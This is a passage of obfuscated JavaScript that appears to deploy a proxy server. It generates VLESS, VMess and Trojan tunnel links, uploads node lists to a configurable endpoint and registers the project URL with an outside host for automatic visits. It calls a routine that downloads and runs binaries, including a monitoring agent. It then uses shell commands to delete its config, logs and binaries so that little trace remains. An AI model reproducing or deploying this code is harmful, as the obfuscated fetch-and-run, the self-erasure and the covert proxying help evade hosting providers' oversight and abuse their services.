axios[_0x16572d(_0x54a2c2._0xcc516a)](_0x16572d(_0x54a2c2._0x2d1b07),{'timeout':0xbb8});if(_0x1a5044[_0x16572d(_0x54a2c2._0x510440)]&&_0x1a5044[_0x16572d(_0x54a2c2._0x41ca7c)][_0x16572d(_0x54a2c2._0x5329cc)]===_0x16572d(_0x54a2c2._0x5b3807)&&_0x1a5044[_0x16572d(0x15b)][_0x16572d(0x133)]&&_0x1a5044[_0x16572d(0x15b)][_0x16572d(_0x54a2c2._0x269a99)])return _0x1a5044['data'][_0x16572d(_0x54a2c2._0x22e595)]+'_'+_0x1a5044[_0x16572d(_0x54a2c2._0x39d1fd)][_0x16572d(0x187)];}catch(_0x19f278){}}return _0x16572d(_0x54a2c2._0xe2c94d);}async function _0x4e071b(_0x28d0c1){const _0x17b332=await _0x314ad5(),_0x560c37=NAME?NAME+'-'+_0x17b332:_0x17b332;return new Promise(_0x1fd2bf=>{const _0x3ebe71={_0x3ed6c1:0x188,_0x3d677e:0x15f,_0xac4dfa:0x197,_0x36959e:0x148,_0x2036dd:0x190,_0x5794b9:0x12e,_0x2e88d6:0x13e,_0x24000d:0x18f,_0x3fe3d3:0x18d,_0x923ca4:0x12e,_0x6c5ebf:0x179};setTimeout(()=>{const _0x213300={_0xd9f84a:0x1a0,_0x387673:0x10f},_0x3518eb=_0x2f69,_0x400c30={'v':'2','ps':''+_0x560c37,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x3518eb(0xf9),'host':_0x28d0c1,'path':_0x3518eb(_0x3ebe71._0x3ed6c1),'tls':_0x3518eb(_0x3ebe71._0x3d677e),'sni':_0x28d0c1,'alpn':'','fp':_0x3518eb(0x1b4)},_0x2e86c8=_0x3518eb(_0x3ebe71._0xac4dfa)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x28d0c1+'&fp=firefox&type=ws&host='+_0x28d0c1+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x560c37+_0x3518eb(_0x3ebe71._0x36959e)+Buffer['from'](JSON[_0x3518eb(_0x3ebe71._0x2036dd)](_0x400c30))[_0x3518eb(0x1a0)](_0x3518eb(_0x3ebe71._0x5794b9))+_0x3518eb(_0x3ebe71._0x2e88d6)+UUID+'@'+CFIP+':'+CFPORT+_0x3518eb(0xf8)+_0x28d0c1+_0x3518eb(0x15e)+_0x28d0c1+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x560c37+_0x3518eb(_0x3ebe71._0x24000d);console[_0x3518eb(_0x3ebe71._0x3fe3d3)](Buffer[_0x3518eb(0x179)](_0x2e86c8)['toString'](_0x3518eb(_0x3ebe71._0x923ca4))),fs[_0x3518eb(0x186)](subPath,Buffer[_0x3518eb(_0x3ebe71._0x6c5ebf)](_0x2e86c8)[_0x3518eb(0x1a0)](_0x3518eb(0x12e))),console[_0x3518eb(0x18d)](FILE_PATH+_0x3518eb(0x1b6)),uploadNodes(),app[_0x3518eb(0x161)]('/'+SUB_PATH,(_0xf895c8,_0x44ebc0)=>{const _0x97ef11=_0x3518eb,_0x1bd99e=Buffer['from'](_0x2e86c8)[_0x97ef11(_0x213300._0xd9f84a)](_0x97ef11(0x12e));_0x44ebc0['set'](_0x97ef11(0x12d),_0x97ef11(0x119)),_0x44ebc0[_0x97ef11(_0x213300._0x387673)](_0x1bd99e);}),_0x1fd2bf(_0x2e86c8);},0x7d0);});}}async function uploadNodes(){const _0x1c3d2b={_0x10a274:0x1ab,_0x25cf44:0x173,_0x2cc2c3:0x173,_0x37f643:0x112,_0x33cc53:0x1a9,_0x1ab3c1:0x190,_0xb5b68a:0x1b1,_0x1197f4:0x141,_0x13c340:0x173},_0x4b9537=_0x22d57d;if(UPLOAD_URL&&PROJECT_URL){const _0x1525f0=PROJECT_URL+'/'+SUB_PATH,_0xc6c15f={'subscription':[_0x1525f0]};try{const _0xdb9ce4=await axios[_0x4b9537(_0x1c3d2b._0x10a274)](UPLOAD_URL+_0x4b9537(0xf7),_0xc6c15f,{'headers':{'Content-Type':_0x4b9537(0x141)}});return _0xdb9ce4&&_0xdb9ce4[_0x4b9537(_0x1c3d2b._0x25cf44)]===0xc8?(console['log'](_0x4b9537(0x16c)),_0xdb9ce4):null;}catch(_0x82e30f){if(_0x82e30f[_0x4b9537(0x17e)]){if(_0x82e30f['response'][_0x4b9537(_0x1c3d2b._0x2cc2c3)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4b9537(0xfb)](listPath))return;const _0x321d8f=fs[_0x4b9537(_0x1c3d2b._0x37f643)](listPath,_0x4b9537(0x18b)),_0x34bac3=_0x321d8f['split']('\x0a')[_0x4b9537(_0x1c3d2b._0x33cc53)](_0x2bb243=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2bb243));if(_0x34bac3[_0x4b9537(0x18c)]===0x0)return;const _0xa956c6=JSON[_0x4b9537(_0x1c3d2b._0x1ab3c1)]({'nodes':_0x34bac3});try{const _0x44428b=await axios[_0x4b9537(0x1ab)](UPLOAD_URL+_0x4b9537(_0x1c3d2b._0xb5b68a),_0xa956c6,{'headers':{'Content-Type':_0x4b9537(_0x1c3d2b._0x1197f4)}});return _0x44428b&&_0x44428b[_0x4b9537(_0x1c3d2b._0x13c340)]===0xc8?(console[_0x4b9537(0x18d)](_0x4b9537(0x10b)),_0x44428b):null;}catch(_0x1f4ac6){return null;}}else return;}}function cleanFiles(){const _0x4f5ecd={_0x5e0d67:0x166,_0x394a5f:0x13b,_0x369958:0x1a3,_0xf20c0e:0x1a8,_0x27dbf8:0x192,_0x2d0759:0x145},_0x589e60={_0x4ab945:0x164,_0x314a44:0x19c};setTimeout(()=>{const _0x2a3270={_0x3d26f9:0x18d,_0x5a2c1d:0x19c},_0x43abde=_0x2f69,_0x51ead4=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x51ead4['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x51ead4[_0x43abde(_0x4f5ecd._0x5e0d67)](phpPath);process[_0x43abde(0x1b8)]===_0x43abde(_0x4f5ecd._0x394a5f)?exec(_0x43abde(_0x4f5ecd._0x369958)+_0x51ead4[_0x43abde(_0x4f5ecd._0xf20c0e)]('\x20')+_0x43abde(_0x4f5ecd._0x27dbf8),_0x2471f4=>{const _0xc2d780=_0x43abde;console[_0xc2d780(0x164)](),console[_0xc2d780(_0x2a3270._0x3d26f9)](_0xc2d780(_0x2a3270._0x5a2c1d)),console[_0xc2d780(0x18d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x43abde(0x130)+_0x51ead4[_0x43abde(0x1a8)]('\x20')+_0x43abde(_0x4f5ecd._0x2d0759),_0x3f740f=>{const _0x3477b4=_0x43abde;console[_0x3477b4(_0x589e60._0x4ab945)](),console[_0x3477b4(0x18d)](_0x3477b4(_0x589e60._0x314a44)),console[_0x3477b4(0x18d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4892f5={_0x188540:0x18d,_0x242b58:0x17b,_0xada8e0:0x1a2},_0x541afd=_0x22d57d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x541afd(_0x4892f5._0x188540)](_0x541afd(_0x4892f5._0x242b58));return;}try{const _0x32afde=await axios[_0x541afd(0x1ab)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x541afd(0x141)}});return console[_0x541afd(0x18d)](_0x541afd(0x1b7)),_0x32afde;}catch(_0x4fad02){return console[_0x541afd(0x155)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x4fad02[_0x541afd(_0x4892f5._0xada8e0)]),null;}}async function startserver(){const _0x1d5140={_0x160bce:0x155},_0x51a996=_0x22d57d;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x69acb0){console[_0x51a996(_0x1d5140._0x160bce)](_0x51a996(0x17a),_0x69acb0);}}startserver()[_0x22d57d(0x13a)](_0x19ae26=>{const _0x5c40eb=_0x22d57d;console[_0x5c40eb(0x155)]('Unhandled\x20error\x20in\x20startserver:',_0x19ae26);}),app['listen'](PORT,()=>console[_0x22d57d(0x18d)](_0x22d57d(0x110)+PORT+'!'));
